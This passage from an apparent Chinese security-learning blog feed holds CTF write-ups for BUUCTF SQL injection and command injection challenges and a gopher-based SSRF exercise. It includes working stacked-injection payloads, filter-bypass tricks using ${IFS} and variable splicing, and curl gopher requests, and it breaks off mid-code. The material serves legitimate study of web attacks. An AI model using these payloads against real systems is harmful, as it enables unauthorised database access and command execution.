    <content type="html"><![CDATA[<h1 id="BUUCTF-Writeup"><a href="#BUUCTF-Writeup" class="headerlink" title="BUUCTF  Writeup"></a><em>BUUCTF  Writeup</em></h1><h2 id="EasySql"><a href="#EasySql" class="headerlink" title="EasySql"></a>EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p><p><img src="/2023/03/09/BUUCTF/image-20230213012236141.png"></p><p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013114976.png"></p><p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013848916.png"></p><p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p><p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p><p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p><p>虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag；</p><p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p><hr><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p><p><img src="/2023/03/09/BUUCTF/image-20230213133221152.png"></p><p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/03/09/BUUCTF/image-20230213140043405.png"></p><p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213140715876.png"></p><p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到select，尝试能否绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还是没绕过，暂时放弃这条路。</p><p><img src="/2023/03/09/BUUCTF/image-20230213143545653.png"></p><p>查找学习show databases爆数据库名。<img src="/2023/03/09/BUUCTF/image-20230213144232143.png"></p><p>show tables爆表名，好臭的表名啊(。</p><p><img src="/2023/03/09/BUUCTF/image-20230213144433988.png"></p><p>‘; show columns from `1919810931114514`;#爆字段名（表名要用反引号引起来）</p><p><img src="/2023/03/09/BUUCTF/image-20230213144916052.png"></p><p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] read first;#从表的第一列开始读（指针的起点）<br>handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137）<br></code></pre></td></tr></table></figure><p>最终构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213152804918.png"></p><p>拿到flag。</p><p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p><p>预编译相关语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set : #设置变量；<br>prepare : #准备一个语句赋予其名称，之后直接调用语句；<br>execute :#执行语句；<br></code></pre></td></tr></table></figure><p>以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。</p><p>步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel;#执行sel语句；<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213160841525.png"></p><p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213161126295.png"></p><p>十六进制绕过的步骤如下：</p><p>打开mysql命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213162154710.png"></p><p>得到一串十六进制字符串。</p><p>构造预处理语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p>set同样大写绕过，payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213163140720.png"></p><p>GET到flag；</p><p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213164015355.png"></p><p>推测回显内容来自于data字段；</p><p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p><p>相关语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table [表名] add [字段名] int(***)/varchar(***) #增加列<br>alter table [表名] drop [字段名]#删除列<br>alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段<br>alter table [表名] rename to [新表名]#重命名表,to可省略<br>rename table [表名] to [新表名]#重命名表<br></code></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);#<br>#修改flag字段名为id<br></code></pre></td></tr></table></figure><hr><h2 id="PingPingPing"><a href="#PingPingPing" class="headerlink" title="PingPingPing"></a>PingPingPing</h2><p>做这道题时想到前面做过的另外一题（新生赛exec）。总结了以下联合执行的符号作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">p1;p2:<span class="hljs-string">&quot;先执行p1后执行p2;</span><br><span class="hljs-string">p1|p2:p1的输出作为p2的输入，只显示p2的结果；</span><br><span class="hljs-string">p1||p2:若p1为假则执行p2，为真停止执行；</span><br><span class="hljs-string">p1&amp;&amp;p2:若p1为真则执行p2，为假停止执行；</span><br></code></pre></td></tr></table></figure><p>传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=| ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021610128.png"></p><p>说实话一开始没反应过来space是空格的意思就没想着空格被过滤了（，单纯以为是表达错误不需要空格然后把空格删掉发现可以执行,直到下面cat命令没法正常执行时才反应过来是空格被ban了（。</p><p>提示空格被ban了，传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|ls<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=;ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021933333.png"></p><p>回显提示目录里有flag.php和index.php</p><p>直接</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|cat flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214022139800.png"></p><p>然后提示空格被ban了。参考了大佬们的博客，大佬总结了以下几点绕过空格的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;IFS&#125;$<span class="hljs-number">9</span><br>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><br>$&#123;IFS&#125;<br>$IFS$<span class="hljs-number">1</span> <span class="hljs-comment">//$1改成$加其他数字貌似都行</span><br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class="hljs-comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br>%<span class="hljs-number">20</span>   (space)<br>%<span class="hljs-number">09</span>   (tab)<br>X=$<span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br><span class="hljs-comment">#来自大佬博客：https://blog.csdn.net/vanarrow/article/details/108295481</span><br><br></code></pre></td></tr></table></figure><p>逐一试下来发现$IFS$1是可行的但是提示flag被ban了（悲）</p><p><img src="/2023/03/09/BUUCTF/image-20230214023158094.png"></p><p>既然看不了flag又不知道过滤规则，反正还有个index.php能看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=|<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1index</span>.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214023326732.png"></p><p>密密麻麻的这么多都被过滤了，括号引号星号全员过滤。。。想起之前从学长那里学来的星号绕过，也不能用了，没有头绪的时候。</p><p>正巧刚刚在学习绕过空格过滤的时候看到一篇博客，<a href="https://www.cnblogs.com/GLory-LTF/p/15359485.html%E3%80%82%E9%87%8C%E9%9D%A2%E6%9C%89%E8%AE%B2%E5%88%B0%E5%A6%82%E6%9E%9Ccat%E5%AD%97%E7%AC%A6%E8%A2%ABban%E4%BA%86%E4%BD%86%E6%98%AF%E9%9D%9E%E5%BE%97%E7%94%A8cat%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8B%E7%BB%8D%E4%BA%86%E4%B8%80%E7%A7%8D%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%EF%BC%88%E8%AE%B0%E5%B0%8F%E6%9C%AC%E6%9C%AC%EF%BC%89%E3%80%82">https://www.cnblogs.com/GLory-LTF/p/15359485.html。里面有讲到如果cat字符被ban了但是非得用cat命令，这里介绍了一种命令拼接绕过（记小本本）。</a></p><p>理论知道了，开始实践</p><p><img src="/2023/03/09/BUUCTF/image-20230214025001351.png"></p><p>嗯。。属于是学了点知识不会灵活变通了，再次求助大佬，给出的payload是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><p>又有收获了，拼接绕过不一定要每个字母都拼接，看着这个payload有个想法，如果把$a的位置在flag四个位置改变会怎么样。实践。</p><p><img src="/2023/03/09/BUUCTF/image-20230214025741500.png"></p><p>替换字符f的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025844260.png"></p><p>替换字符l的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025933119.png"></p><p>替换字符a的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214030039533.png"></p><p>看来只有g的位置可以。然后注意到$a是代码中原有的变量，如果构造payload时用的是b变量会怎么样呢</p><p><img src="/2023/03/09/BUUCTF/image-20230214030227918.png"></p><p>也是可行的</p>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ROIS冬令营</title>
    <link href="/2023/02/10/ROIS/"/>
    <url>/2023/02/10/ROIS/</url>
    
    <content type="html"><![CDATA[<h1 id="2023ROIS冬令营"><a href="#2023ROIS冬令营" class="headerlink" title="2023ROIS冬令营"></a>2023ROIS冬令营</h1><p>梦开始的地方。。。。。。</p><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h3><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/10/ROIS/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/10/ROIS/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/10/ROIS/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/10/ROIS/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 